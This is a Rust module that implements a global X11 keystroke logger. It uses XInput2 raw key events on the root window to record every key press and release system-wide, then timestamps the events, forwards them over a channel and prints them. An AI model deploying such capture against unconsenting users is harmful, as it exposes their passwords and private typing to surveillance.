use std::error::Error;
use std::ffi::CStr;
use std::io::Write;
use std::ptr;
use std::sync::mpsc::Sender;
use std::time::SystemTime;

use crate::events::KeyEvent;
use x11::xinput2::*;
use x11::xlib::*;

// Uproszczony handler błędów X11 bez zbędnych mutexów globalnych
extern "C" fn x_error_handler(_display: *mut Display, err: *mut XErrorEvent) -> i32 {
    unsafe {
        let mut buf = [0i8; 512];
        XGetErrorText((*err).display, (*err).error_code as i32, buf.as_mut_ptr(), buf.len() as i32);
        eprintln!("X11 Error: {}", CStr::from_ptr(buf.as_ptr()).to_string_lossy());
    }
    0
}

#[allow(non_upper_case_globals)]
pub fn run(tx: Sender<KeyEvent>) -> Result<(), Box<dyn Error>> {
    unsafe {
        let display = XOpenDisplay(ptr::null());
        if display.is_null() {
            return Err("Unable to open X display. Is $DISPLAY set?".into());
        }
        XSetErrorHandler(Some(x_error_handler));
        let root = XDefaultRootWindow(display);

        // Sprawdzenie rozszerzenia XInput
        let (mut xi_opcode, mut ev, mut err) = (0, 0, 0);
        if XQueryExtension(display, b"XInputExtension\0".as_ptr() as *const i8, &mut xi_opcode, &mut ev, &mut err) == 0 {
            XCloseDisplay(display);
            return Err("XInput extension not available".into());
        }

        // Przygotowanie maski zdarzeń na stosie (zamiast Vec + mem::forget)
        let mut mask_bytes = [0u8; 4];
        XISetMask(&mut mask_bytes, XI_RawKeyPress);
        XISetMask(&mut mask_bytes, XI_RawKeyRelease);

        let mut mask = XIEventMask {
            deviceid: XIAllMasterDevices,
            mask_len: mask_bytes.len() as i32,
            mask: mask_bytes.as_mut_ptr(),
        };

        if XISelectEvents(display, root, &mut mask, 1) != 0 {
            XCloseDisplay(display);
            return Err("XISelectEvents failed".into());
        }

        XSync(display, False);
        println!("X11 Keylogger initialized successfully.");

        let mut event: XEvent = std::mem::zeroed();

        loop {
            // Blokuje wątek do momentu naciśnięcia klawisza (brak potrzeby thread::sleep)
            XNextEvent(display, &mut event);

            if event.type_ == GenericEvent {
                let mut cookie: XGenericEventCookie = event.generic_event_cookie;
                
                if XGetEventData(display, &mut cookie) != 0 {
                    let ev_type = cookie.evtype as i32;

                    if ev_type == XI_RawKeyPress || ev_type == XI_RawKeyRelease {
                        let raw = cookie.data as *mut XIRawEvent;
                        let keycode = (*raw).detail as u32;
                        
                        // Tłumaczenie kodu na czytelną nazwę klawisza
                        let keysym = XKeycodeToKeysym(display, keycode as u8, 0);
                        let name = if keysym == 0 {
                            "Unknown".to_string()
                        } else {
                            CStr::from_ptr(XKeysymToString(keysym)).to_string_lossy().into_owned()
                        };

                        // Wspólna logika dla obu typów zdarzeń (DRY - Don't Repeat Yourself)
                        let event_name = if ev_type == XI_RawKeyPress { "PRESS" } else { "RELEASE" };

                        let _ = tx.send(KeyEvent {
                            event_type: event_name,
                            key_name: name.clone(),
                            keycode,
                            timestamp: SystemTime::now(),
                        });

                        println!("Key {}: {} (xcode={})", event_name.to_lowercase(), name, keycode);
                        std::io::stdout().flush().unwrap();
                    }
                    XFreeEventData(display, &mut cookie);
                }
            }
        }
    }
}